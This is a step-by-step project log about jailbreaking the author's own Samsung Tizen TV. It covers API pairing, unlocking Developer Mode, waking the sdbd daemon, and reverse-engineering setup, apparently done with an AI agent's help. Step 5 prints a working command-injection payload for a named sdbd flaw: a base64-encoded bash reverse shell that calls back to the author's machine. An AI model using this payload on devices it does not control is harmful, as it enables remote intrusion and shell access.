# The whole story, step by step (full detail)

*Companion to JAILBREAK.md. Written to be read in order; each step is self-contained.
The TL;DR lives at the top of JAILBREAK.md.*

## Step 1 — Earning the right to talk to the TV (Control 2.0 pairing)

**The problem.** A smart TV doesn't listen to random computers. Samsung's official
answer is the **Control 2.0 API** — a websocket on port 8002 that lets a *paired*
device send remote-key events (power, volume, arrows…). Unpaired, the channel
answers `ms.channel.unauthorized` and hangs up.

**What we did.** From the Mac:
1. Open `wss://192.168.1.119:8002/api/v2/channels/samsung.remote.control?name=U2Ftc3VuZ1JlbW90ZUFwcA==`
   (the `name` is base64 of "SamsungRemoteApp" — a constant, not a choice)
2. Send `{"event":"req","id":"pairing","data":"pairing"}` → TV shows allow popup + an 8-digit PIN
3. Feed the PIN back **on the same websocket connection** → TV returns a bearer token
   → saved to `token.txt`. The token survives reboots; we never pair again.

**The three traps (each cost a real round):**
- The TV **silently drops any key sent before its `ms.channel.connect` handshake
  finishes**. Early commands were "sent" and did nothing. Fix in `remote.js`: wait
  for the connect ack before firing.
- **Key names lie per generation and are silently ignored when wrong.**
  `KEY_VOLUMEUP` is a ghost on this TV; `KEY_VOLUP` is real. Same for
  `KEY_VOLUMEDOWN`→`KEY_VOLDOWN`, `KEY_CHANNELUP`→`KEY_CHUP`. `remote.js` carries
  an alias table so you can say the obvious names.
- 8002 uses a **self-signed certificate** — the client trusts it with
  `rejectUnauthorized: false` (acceptable on a home LAN).

**Important correction (user-verified):** the remote stayed **flaky until
Developer Mode was enabled** — mute landed, volume was dropped, and the confirmed
volume 7→10 only happened after the user had flipped Developer Mode on themselves.
On this firmware, dev mode / the IP-authorized-host status is partly what makes the
Control 2.0 API reliable. Pairing alone is not enough.

**Result:** `remote.js` — one sentence drives the TV. Verified: volume, mute,
power, navigation, app keys.

## Step 2 — The 123-12345 ritual (unlocking Developer Mode)

**The problem.** We wanted the development back door, not just a remote. There is
**no menu setting** for Developer Mode on this model — not under General (this
generation's menu is flat, no General sub-menu), not under External Device Manager,
not anywhere findable. Samsung hid it behind a key code.

**The working sequence** (user had eyes, agent was blind — division of labor):
1. **Home → open the Apps panel**
2. **Scroll to the bottom → "App Settings"** (a list item, NOT a gear icon — the
   gear icon was my wrong guess for a while)
3. **Press the small `123` button on the remote** → the on-screen number keypad
   appears (it's the store's search keypad, which caused one confused round —
   "12345" once ended up in a store search, giving YouTube-only results)
4. **Type `12345`** — worked via D-pad taps on the keypad (the code needs a few
   tries; too-fast entry misses keystrokes per community reports)
5. Gray **Developer Mode dialog** appears.

**The dialog contains exactly:** one toggle (Developer Mode) + one IP field
(**the development computer's IP** — the Mac's `192.168.1.7`, NOT the TV's own
IP). No Reconnect button, no SSH/TSS checkboxes (user-verified).

**Why it took so long:**
- The 123 code only registers **from within App Settings** — home screen and store
  search were both dead
- `KEY_123` sent over the API is a ghost (like the volume names) — the physical
  123 button on the user's remote had to be pressed by hand
- 50-hour auto-off policy applies (the leash that killed Tizen's jailbreak culture);
  for us it has simply stayed on

**Proof:** Control 2.0 API reports `developerMode: "1"`, `developerIP: "192.168.1.7"`.

**Why it matters:** this is the *permission* for the dev channel. But the TV's
daemon only *acts* on it at a true boot → Step 3.

## Step 3 — The sdbd mystery (and the fix that wasn't a CVE)

**What sdbd is.** Every Tizen firmware ships a **development bridge daemon**
(`sdbd`) — the on-TV half of `sdb` (Samsung Device Bridge), the "phone cable for
developers". It serves: file push/pull, `vd_appinstall` (.tpk sideloading), and on
un-branded sets a real `shell` service. It listens on TCP **26101**. Related ports
in the family: 26099 (older default), 10022 (dev SSH), 49001 (TSS — the daemon that
is supposed to *wake* sdbd, UDP handshake `tss-1.0`).

**The mystery.** Developer Mode on, IP correct (API-verified), TV rebooted (via
`KEY_POWER`) — and ports 26099/26101/10022/49001 all stayed closed. Full
exhaustion, all measured:
- `sdb connect 192.168.1.119:26101` (our own macOS build of sdb 1.0.0) → refused
- TSS handshake `tss-1.0` UDP → TV:49001, 5 payload variants → no reply
- TSS listener **on the Mac** at UDP 49001 across a full TV power cycle → TV never
  greets us (the direction we'd had backwards: the TV is supposed to send `tss-1.0`
  to the *Mac*)
- Host-side sdb server (26099) waiting for the TV to dial in → never did
- Broad port scan with dev mode on → only 8080 open
- Conclusion at the wall: our protocol was fine (the sdb build proved it) — the TV
  simply had **no daemon running to talk to**

**The fix.** The scout's 2026 research (tizen-homebrew error table + community
records for 2020–2025 branded sets): **`sdbd` reads the developer IP only at TRUE
BOOT. Standby is not a boot.** Every "reboot" we'd done was `KEY_POWER` = standby.
The TV had never once booted with the IP already committed.

**The cure cost 30 seconds of wall socket:**
```
unplug TV 30s → plug in → power on
$ nc -z -w 2 192.168.1.119 26101   →  26101 OPEN
$ sdb devices                       →  192.168.1.119:26101  device
```

**The lesson (the "exploit" that actually worked):** not a CVE — a **boot-state
bug**. Samsung's own documented flow assumes the IP is set *before* the boot that
starts sdbd; standby-reboots silently keep a stale/empty IP in sdbd's world.
Consequence for us: **sdbd now needs a cold boot after any power event** —
`KEY_POWER` cycles keep it alive, but a real unplug-and-return is the only thing
that wakes it.

## Step 4 — Two generations of sdb clients, connected

**2015 sdb (1.0.0), built by us.** Source: TizenTeam/sdb (the ADB-derivative).
Built for Apple Silicon macOS (needed one `#ifdef __linux__` patch for
`MS_REMOUNT` in `remount_service.c`). Quirk: on arm64 hosts the Makefile aliases
the client target to `bin/sdbd`. Binary + patched source live in `sdb/`.
- `connect 192.168.1.119:26101` ✅, `devices` ✅, `get-state` → `device` ✅
- **No `install` command** — it's commented out in `commandline.c:950`. Limited to
  push/pull/shell/dlog.
- Known behavior: its background `fork-server` (26099) holds the TV's single
  connection slot; a second client gets `ECONNRESET` until it's killed.

**2026 client (tizen-homebrew, Bun bundle).** The modern reference
(github.com/SushyDev/tizen-homebrew). Its sdb module opens the **`shell:0`**
stream (the 2015 client opens bare `shell` — another generation difference).
- `connect` ✅ (after killing the stale 2015 daemon)
- `getduid` → **U7CLIM2YTMUHE** — our real device UID; proof we're *inside*
- `platformVersion` → 9.0
- Its own error table names our exact symptom: `ECONNREFUSED` = sdbd not running;
  `ECONNRESET` = client IP ≠ developer IP

**State of the channel after Step 4:** we are connected, authorized, identified.
What's missing: any service that *executes* something.

## Step 5 — SVE-2025-50109 (the named CVE) and the 2021 stub wall

**The CVE** (Bishop Fox, Feb 2026): **SVE-2025-50109** — command injection in
sdbd's `vd_appinstall`. The **.tpk filename argument** is passed to a **device-side
`system()`**, so a path containing `$(cmd)` executes on the TV *before* the
installer even inspects the file. Demonstrated on three physical TVs including a
2020 TU-series and a **2022 CU-7000 — our hardware family**. It pops a shell as
user `sdk` with full filesystem access.

**The payload, exploded:**
```
sdb install "new$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNy80OTA4OCAwPiYx | base64 -d | bash).tpk"
            └─ device shell expands this before install starts ─┘
               decodes to: bash -i >& /dev/tcp/192.168.1.7/49088 0>&1
   → 1. TV shell expands $( … )  →  bash -i runs on the TV
   → 2. bash -i dials the Mac at 192.168.1.7:49088
   → 3. interactive prompt lands in our nc listener  →  OS shell
```

**What we did with it:**
- Fired through the 2015 sdb → it has no `install` command at all (the vector
  doesn't exist in that client)
- Fired through the 2026 client's `vd_appinstall <pkgId> <path>` with the injected
  packageId (marker-file variant + base64 reverse-shell variant) → **accepted, no
  error** (vd_appinstall keeps its stream open, as expected)… **and no shell came home**

**The timing test that cracked it open:**
```
exec('shell:0 sleep 5 && echo SLEPT')  →  returned in 6ms, empty
```
A 5-second command can't finish in 6ms — so **`shell:0` is a no-op stub on this
firmware**: the stream opens, the command is accepted, nothing executes, stdout
comes back empty. Same shape for `uname -a`, `ls`, and file-listing pulls
(`sdbd:0` directory listings returned 0 bytes). Only sdbd **builtins** answer
(`getduid`).

**Interpretation:** branded 2021 sets trim the exec surface. The injection very
likely fired into a path that's stubbed too — or `vd_appinstall`'s `system()` call
gates behind something we can't see from outside. The answer is **inside the sdbd
binary**, which is exactly what Step 6 is for.

## Step 6 — The REA disassembler (armed, waiting for prey)

**REA** (github.com/morluto/rea, "Reverse Engineer Anything"): MCP server + CLI
(`rea-agents`, npm 6.5.0) wrapping Ghidra/Hopper/IDA for native binaries, plus
JS/Electron/firmware/SQLite analysis. The repo's `licenses/` folder is just bundled
OSS license text (GPL/LGPL/Apache) — compliance paperwork, nothing to install.
**Hopper is paid; we used Ghidra (free, NSA's suite)** — the `rea` LSP/setup
question was settled: no Hopper license needed.

**Setup (all in `sdb/rea-notes.md`):**
- Ghidra **12.1.4** installed via brew cask (Apple Silicon: the bundled
  `decompile.c` had to be compiled first — done)
- REA 6.5.0 wired as MCP provider `ghidra-12.1.4`
- **Proven end-to-end on a real ELF** (Tizen TV binaries are ELFs):
  compiled a tiny C program, `rea decompile` returned clean pseudocode
  (`int main(void){ return 42; }`) — plus symbols and strings
- First flex: ran it on our own `sdb` binary and pulled out Samsung's IPC surface
  (`/dev/samsung_sdb`, DBus strings)

**The blocker:** the firmware. `sfd`/SamFirm downloads go to Samsung's FOTA CDN,
which **403s this Mac's IP at the Akamai edge** (all regions/models tried).
Workarounds for next session:
1. Download through a **residential IP** (phone hotspot, 2 minutes of user time)
2. Or grab a **pre-extracted CU7105 rootfs** / the `sdbd` .tpk from Tizen repos
3. Or: if the exploit ever gives us install, pull the binary **off the TV itself**
   (chicken-and-egg, but the door being open changes the math)

**The plan:** firmware → extract rootfs → `rea decompile sdbd` → find the exact
exec gate (where `vd_appinstall` calls `system()`, what the 2021 build stubs,
what would un-stub it) → fire the right payload → `whoami` → `sdk`.

## Off-LAN access (the Tailscale question)

Question: "can I access the TV from remote or must I be on the same network?"
Answer: as it stands, same network only (192.168.1.119 has no public address).
Two real paths (full doc: `REMOTE-ACCESS.md`):
- **Path A (recommended, zero TV changes):** Tailscale **subnet route via
  lysk-server** (the always-on box, already on the tailnet):
  `tailscale up --advertise-routes=192.168.1.0/24` on the server → reach the TV
  from anywhere through the tailnet. Covers the remote, sdb (after cold boot),
  everything.
- **Path B (after the exploit):** no official Tailscale Tizen app exists (Tizen ≠
  Android). Experimental community app **tailscale/tailscale-tizen** (userspace
  tailscaled, gVisor netstack, no root, QR login) exists as a .tpk — but
  sideloading it needs a signed Samsung profile, i.e. the exploit first.

## State of everything (as of 2026-10-15, user away from home)

| Item | State |
|---|---|
| TV | in standby; dev mode ON; dev IP 192.168.1.7; sdbd asleep (needs cold boot) |
| remote.js + token.txt | permanent, one-sentence control from the Mac (LAN) |
| sdb (2015, ours) + tizen-homebrew client (2026) | both connect on 26101 after cold boot |
| REA + Ghidra 12.1.4 | armed, proven on ELF |
| Firmware | blocked on CDN 403 (needs residential IP) |
| Repo | `~/github/tv-remote` — git, token gitignored, all docs committed |

## Resume checklist (when home)
1. **Cold-boot the TV** (unplug 30s → plug in → on) — wakes sdbd (26101)
2. **Firmware**: phone as hotspot for a couple minutes → sfd/samfirm pulls the
   CU7105 EU build → extract rootfs → locate sdbd/tssd
3. **`rea decompile sdbd`** → find the exec gate
4. **Fire the right SVE-2025-50109 payload** (or whatever the decompile reveals)
   → shell as `sdk` → sideload (TizenTube, Jellyfin, tailscale-tizen, our own)
5. **Off-LAN**: `tailscale up --advertise-routes=192.168.1.0/24` on lysk-server
